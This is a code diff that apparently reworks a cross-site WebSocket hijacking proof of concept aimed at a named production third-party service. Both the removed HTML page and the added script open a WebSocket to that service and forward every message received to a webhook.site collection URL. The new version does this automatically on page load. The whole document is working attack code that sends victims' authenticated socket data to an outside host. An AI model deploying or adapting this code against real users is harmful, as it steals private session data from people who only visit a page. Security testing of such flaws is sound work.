@@ -1,27 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Example</title>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var ws = new WebSocket('wss://peer-alb-aps1-prod.browserstack.com/socket.io/?EIO=3&transport=websocket');
-            
-            ws.onopen = function() {
-                ws.send("LOADED");
-            };
-
-            window.sendAdditionalMessage = function() {
-                ws.onmessage = function(event) {
-                    fetch('https://webhook.site/469d381a-8e9e-4ef6-b343-9a736c0749fd', {method: 'POST', mode: 'no-cors', body: event.data});
-                };
-            };
-        });
-    </script>
-</head>
-<body>
-    <p>CSWSH_TEST</p>
-    <button onclick="sendAdditionalMessage()">Send Additional Message</button>
-</body>
-</html>
+<script>
+    var ws = new WebSocket('wss://peer-alb-aps1-prod.browserstack.com/socket.io/?EIO=3&transport=websocket');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://webhook.site/469d381a-8e9e-4ef6-b343-9a736c0749fd', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
